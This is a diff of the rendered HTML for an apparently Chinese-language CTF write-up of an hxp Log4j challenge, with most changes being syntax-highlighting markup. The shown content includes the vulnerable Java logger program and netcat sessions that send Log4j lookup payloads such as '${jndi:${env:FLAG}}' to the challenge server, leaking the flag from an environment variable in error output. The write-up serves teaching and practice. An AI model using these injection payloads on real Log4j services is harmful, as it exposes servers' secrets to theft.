@@ -2227,6 +2227,20 @@
 
             
           
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blockchain/tetctftoken/" class="md-nav__link">
+        TetCTFToken
+      </a>
+    </li>
+  
+
+            
+          
         </ul>
       </nav>
     </li>
@@ -2623,36 +2637,36 @@
 <ul>
 <li>只有执行异常时才会触发 <code>System.err.println(exception)</code>，看到 Lookups 解析后的结果</li>
 </ul>
-<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Scanner</span><span class="p">;</span><span class="w"></span>
-<span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.logging.log4j.LogManager</span><span class="p">;</span><span class="w"></span>
-<span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.logging.log4j.Logger</span><span class="p">;</span><span class="w"></span>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Scanner</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.logging.log4j.LogManager</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.logging.log4j.Logger</span><span class="p">;</span>
 
-<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Vuln</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">paramArrayOfString</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">            </span><span class="n">Logger</span><span class="w"> </span><span class="n">logger</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LogManager</span><span class="p">.</span><span class="na">getLogger</span><span class="p">(</span><span class="n">Vuln</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w"></span>
-<span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;What is your favourite CTF?&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Scanner</span><span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="na">in</span><span class="p">)).</span><span class="na">next</span><span class="p">();</span><span class="w"></span>
-<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">str</span><span class="p">.</span><span class="na">toLowerCase</span><span class="p">().</span><span class="na">contains</span><span class="p">(</span><span class="s">&quot;dragon&quot;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">                </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;&lt;3&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="w">                </span><span class="n">System</span><span class="p">.</span><span class="na">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
+<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Vuln</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">paramArrayOfString</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">Logger</span><span class="w"> </span><span class="n">logger</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LogManager</span><span class="p">.</span><span class="na">getLogger</span><span class="p">(</span><span class="n">Vuln</span><span class="p">.</span><span class="na">class</span><span class="p">);</span>
+<span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;What is your favourite CTF?&quot;</span><span class="p">);</span>
+<span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Scanner</span><span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="na">in</span><span class="p">)).</span><span class="na">next</span><span class="p">();</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">str</span><span class="p">.</span><span class="na">toLowerCase</span><span class="p">().</span><span class="na">contains</span><span class="p">(</span><span class="s">&quot;dragon&quot;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;&lt;3&quot;</span><span class="p">);</span>
+<span class="w">                </span><span class="n">System</span><span class="p">.</span><span class="na">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
 <span class="w">            </span><span class="p">}</span><span class="w"> </span>
-<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">str</span><span class="p">.</span><span class="na">toLowerCase</span><span class="p">().</span><span class="na">contains</span><span class="p">(</span><span class="s">&quot;hxp&quot;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">                </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;:)&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">                </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;:(&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="w">                </span><span class="n">logger</span><span class="p">.</span><span class="na">error</span><span class="p">(</span><span class="s">&quot;Wrong answer: {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">str</span><span class="p">);</span><span class="w"></span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">str</span><span class="p">.</span><span class="na">toLowerCase</span><span class="p">().</span><span class="na">contains</span><span class="p">(</span><span class="s">&quot;hxp&quot;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;:)&quot;</span><span class="p">);</span>
+<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;:(&quot;</span><span class="p">);</span>
+<span class="w">                </span><span class="n">logger</span><span class="p">.</span><span class="na">error</span><span class="p">(</span><span class="s">&quot;Wrong answer: {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">str</span><span class="p">);</span>
 <span class="w">            </span><span class="p">}</span><span class="w"> </span>
-<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">exception</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">err</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">exception</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">exception</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">err</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">exception</span><span class="p">);</span>
 <span class="w">        </span><span class="p">}</span><span class="w"> </span>
-<span class="w">    </span><span class="p">}</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div>
 </li>
 <li>
 <p>那么 Flag 在哪里呢？看看 <code>Dockerfile</code>，发现 Flag 已经写到环境变量里了！</p>
-<div class="highlight"><pre><span></span><code>CMD ynetd -np y -lm -1 -lpid <span class="m">64</span> -lt <span class="m">10</span> -t <span class="m">30</span> <span class="s2">&quot;FLAG=&#39;</span><span class="k">$(</span>cat /flag.txt<span class="k">)</span><span class="s2">&#39; /home/ctf/run.sh&quot;</span>
+<div class="highlight"><pre><span></span><code>CMD<span class="w"> </span>ynetd<span class="w"> </span>-np<span class="w"> </span>y<span class="w"> </span>-lm<span class="w"> </span>-1<span class="w"> </span>-lpid<span class="w"> </span><span class="m">64</span><span class="w"> </span>-lt<span class="w"> </span><span class="m">10</span><span class="w"> </span>-t<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="s2">&quot;FLAG=&#39;</span><span class="k">$(</span>cat<span class="w"> </span>/flag.txt<span class="k">)</span><span class="s2">&#39; /home/ctf/run.sh&quot;</span>
 </code></pre></div>
 </li>
 <li>
@@ -2661,17 +2675,17 @@
 <li>首先，需要使用 Environment Lookup 取得环境变量中的 Flag：<code>${env:FLAG}</code></li>
 <li>为了触发异常，再把 Environment Lookup 嵌套到其它查找失败会触发异常的 Lookups，如 <code>java</code>、<code>jndi</code></li>
 </ul>
-<div class="highlight"><pre><span></span><code>$ nc <span class="m">65</span>.108.176.77 <span class="m">1337</span>
-What is your favourite CTF?
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>nc<span class="w"> </span><span class="m">65</span>.108.176.77<span class="w"> </span><span class="m">1337</span>
+What<span class="w"> </span>is<span class="w"> </span>your<span class="w"> </span>favourite<span class="w"> </span>CTF?
 <span class="si">${</span><span class="nv">jndi</span><span class="p">:</span><span class="si">${</span><span class="nv">env</span><span class="p">:</span><span class="nv">FLAG</span><span class="si">}}</span>
 :<span class="o">(</span>
-<span class="m">2021</span>-12-20 <span class="m">03</span>:18:44,730 main WARN Error looking up JNDI resource <span class="o">[</span>hxp<span class="o">{</span>Phew, I am glad I code everything <span class="k">in</span> PHP anyhow :<span class="o">)</span> - :<span class="o">(</span> :<span class="o">(</span> :<span class="o">(}]</span>. javax.naming.NoInitialContextException: Need to specify class name <span class="k">in</span> environment or system property, or <span class="k">in</span> an application resource file: java.naming.factory.initial
+<span class="m">2021</span>-12-20<span class="w"> </span><span class="m">03</span>:18:44,730<span class="w"> </span>main<span class="w"> </span>WARN<span class="w"> </span>Error<span class="w"> </span>looking<span class="w"> </span>up<span class="w"> </span>JNDI<span class="w"> </span>resource<span class="w"> </span><span class="o">[</span>hxp<span class="o">{</span>Phew,<span class="w"> </span>I<span class="w"> </span>am<span class="w"> </span>glad<span class="w"> </span>I<span class="w"> </span>code<span class="w"> </span>everything<span class="w"> </span><span class="k">in</span><span class="w"> </span>PHP<span class="w"> </span>anyhow<span class="w"> </span>:<span class="o">)</span><span class="w"> </span>-<span class="w"> </span>:<span class="o">(</span><span class="w"> </span>:<span class="o">(</span><span class="w"> </span>:<span class="o">(}]</span>.<span class="w"> </span>javax.naming.NoInitialContextException:<span class="w"> </span>Need<span class="w"> </span>to<span class="w"> </span>specify<span class="w"> </span>class<span class="w"> </span>name<span class="w"> </span><span class="k">in</span><span class="w"> </span>environment<span class="w"> </span>or<span class="w"> </span>system<span class="w"> </span>property,<span class="w"> </span>or<span class="w"> </span><span class="k">in</span><span class="w"> </span>an<span class="w"> </span>application<span class="w"> </span>resource<span class="w"> </span>file:<span class="w"> </span>java.naming.factory.initial
 ...
-$ nc <span class="m">65</span>.108.176.77 <span class="m">1337</span>
-What is your favourite CTF?
+$<span class="w"> </span>nc<span class="w"> </span><span class="m">65</span>.108.176.77<span class="w"> </span><span class="m">1337</span>
+What<span class="w"> </span>is<span class="w"> </span>your<span class="w"> </span>favourite<span class="w"> </span>CTF?
 <span class="si">${</span><span class="nv">java</span><span class="p">:</span><span class="si">${</span><span class="nv">env</span><span class="p">:</span><span class="nv">FLAG</span><span class="si">}}</span>
 :<span class="o">(</span>
-<span class="m">2021</span>-12-20 <span class="m">08</span>:10:40,151 main ERROR An exception occurred processing Appender Console java.lang.IllegalArgumentException: hxp<span class="o">{</span>Phew, I am glad I code everything <span class="k">in</span> PHP anyhow :<span class="o">)</span> - :<span class="o">(</span> :<span class="o">(</span> :<span class="o">(}</span>
+<span class="m">2021</span>-12-20<span class="w"> </span><span class="m">08</span>:10:40,151<span class="w"> </span>main<span class="w"> </span>ERROR<span class="w"> </span>An<span class="w"> </span>exception<span class="w"> </span>occurred<span class="w"> </span>processing<span class="w"> </span>Appender<span class="w"> </span>Console<span class="w"> </span>java.lang.IllegalArgumentException:<span class="w"> </span>hxp<span class="o">{</span>Phew,<span class="w"> </span>I<span class="w"> </span>am<span class="w"> </span>glad<span class="w"> </span>I<span class="w"> </span>code<span class="w"> </span>everything<span class="w"> </span><span class="k">in</span><span class="w"> </span>PHP<span class="w"> </span>anyhow<span class="w"> </span>:<span class="o">)</span><span class="w"> </span>-<span class="w"> </span>:<span class="o">(</span><span class="w"> </span>:<span class="o">(</span><span class="w"> </span>:<span class="o">(}</span>
 ...
 </code></pre></div>
 </li>
